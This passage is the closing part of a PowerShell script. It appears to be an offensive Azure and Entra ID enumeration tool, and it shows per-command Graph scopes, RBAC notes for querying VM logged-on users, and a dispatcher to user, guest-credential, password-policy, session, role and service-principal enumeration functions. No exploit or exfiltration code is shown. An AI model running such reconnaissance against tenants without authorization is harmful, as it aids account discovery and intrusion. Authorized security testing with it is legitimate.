        "pass-pol" { "Organization.Read.All,Directory.Read.All,Policy.Read.All" }
        "sessions" { "AuditLog.Read.All,Directory.Read.All" }
        "roles" { "RoleManagement.Read.Directory,Directory.Read.All,RoleEligibilitySchedule.Read.Directory" }
        "guest-vuln-scan" { "User.Read.All,Group.Read.All,Device.Read.All,Application.Read.All,Directory.Read.All,Policy.Read.All" }
        "apps" { "Application.Read.All,Directory.Read.All" }
        "ca-policies" { "Policy.Read.All,Directory.Read.All" }
        "sp-discovery" { 
            if ($IncludeWritePermissions) {
                "Application.Read.All,Directory.Read.All,AppRoleAssignment.ReadWrite.All"
            } else {
                "Application.Read.All,Directory.Read.All"
            }
        }
        default { $Scopes }
    }
    
    Connect-GraphAPI -Scopes $requiredScopes
}

# vuln-list and guest-vuln-scan require Graph module but handle connection internally
if ($Command -eq "vuln-list" -or $Command -eq "guest-vuln-scan") {
    Initialize-GraphModule
}

# vm-loggedon uses Azure Resource Manager (Az modules) with RBAC, not Graph API
if ($Command -eq "vm-loggedon") {
    Write-ColorOutput -Message "`n[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] AZURE VM ENUMERATION - RBAC REQUIREMENTS" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"
    
    Write-ColorOutput -Message "[*] This command uses Azure Resource Manager API (not Microsoft Graph)" -Color "Yellow"
    Write-ColorOutput -Message "[*] Required Azure RBAC Roles (you need ONE of these):`n" -Color "Yellow"
    
    Write-ColorOutput -Message "    Option 1 (Recommended - Minimal Permissions):" -Color "White"
    Write-ColorOutput -Message "      • Reader role (to list VMs)" -Color "Gray"
    Write-ColorOutput -Message "      • Virtual Machine Command Executor role (to query logged-on users)`n" -Color "Gray"
    
    Write-ColorOutput -Message "    Option 2 (Common - Full VM Access):" -Color "White"
    Write-ColorOutput -Message "      • Virtual Machine Contributor role`n" -Color "Gray"
    
    Write-ColorOutput -Message "    Option 3 (Maximum - Subscription Access):" -Color "White"
    Write-ColorOutput -Message "      • Contributor role (full subscription access)`n" -Color "Gray"
    
    Write-ColorOutput -Message "[*] Role assignment scope: Subscription or Resource Group level" -Color "Yellow"
    Write-ColorOutput -Message "[*] If you lack permissions, the authentication will succeed but queries will fail`n" -Color "Yellow"
    
    Write-ColorOutput -Message "[*] To check your current Azure permissions:" -Color "Cyan"
    Write-ColorOutput -Message "    Get-AzRoleAssignment -SignInName <your-email>`n" -Color "Gray"
}

switch ($Command) {
    "hosts" {
        Invoke-HostEnumeration -Filter $Filter -ShowOwners $ShowOwners -ExportPath $ExportPath
    }
    "tenant" {
        Invoke-TenantDiscovery -Domain $Domain -ExportPath $ExportPath
    }
    "users" {
        Invoke-UserEnumeration -Domain $Domain -Username $Username -UserFile $UserFile -CommonUsernames $CommonUsernames -ExportPath $ExportPath
    }
    "user-profiles" {
        Invoke-UserProfileEnumeration -ExportPath $ExportPath
    }
    "groups" {
        Invoke-GroupEnumeration -ShowMembers $ShowOwners -ExportPath $ExportPath
    }
    "pass-pol" {
        Invoke-PasswordPolicyEnumeration -ExportPath $ExportPath
    }
    "guest" {
        Invoke-GuestEnumeration -Domain $Domain -Username $Username -Password $Password -UserFile $UserFile -ExportPath $ExportPath
    }
    "vuln-list" {
        Invoke-VulnListEnumeration -Domain $Domain -ExportPath $ExportPath
    }
    "sessions" {
        Invoke-SessionEnumeration -Username $Username -ExportPath $ExportPath -Hours $Hours
    }
    "guest-vuln-scan" {
        Invoke-GuestVulnScanEnumeration -Domain $Domain -ExportPath $ExportPath
    }
    "apps" {
        Invoke-ApplicationEnumeration -ExportPath $ExportPath
    }
    "sp-discovery" {
        Invoke-ServicePrincipalDiscovery -ExportPath $ExportPath
    }
    "roles" {
        Invoke-RoleAssignmentEnumeration -ExportPath $ExportPath
    }
    "ca-policies" {
        Invoke-ConditionalAccessPolicyReview -ExportPath $ExportPath
    }
    "vm-loggedon" {
        Invoke-VMLoggedOnUsersEnumeration -ResourceGroup $ResourceGroup -SubscriptionId $SubscriptionId -VMFilter $VMFilter -ExportPath $ExportPath
    }
    "help" {
        Show-Help
    }
    default {
        Write-ColorOutput -Message "[!] Unknown command: $Command" -Color "Red"
        Write-ColorOutput -Message "[*] Available commands: hosts, tenant, users, user-profiles, groups, pass-pol, guest, vuln-list, sessions, guest-vuln-scan, apps, sp-discovery, roles, ca-policies, vm-loggedon, help" -Color "Yellow"
    }
}

# Disconnect from Microsoft Graph if requested
if ($Disconnect) {
    try {
        $context = Get-MgContext -ErrorAction SilentlyContinue
        if ($context) {
            Write-ColorOutput -Message "`n[*] Disconnecting from Microsoft Graph..." -Color "Yellow"
            Disconnect-MgGraph -ErrorAction Stop
            Write-ColorOutput -Message "[+] Successfully disconnected from Microsoft Graph" -Color "Green"
        }
    } catch {
        Write-ColorOutput -Message "[!] Failed to disconnect from Microsoft Graph: $($_.Exception.Message)" -Color "Red"
    }
}
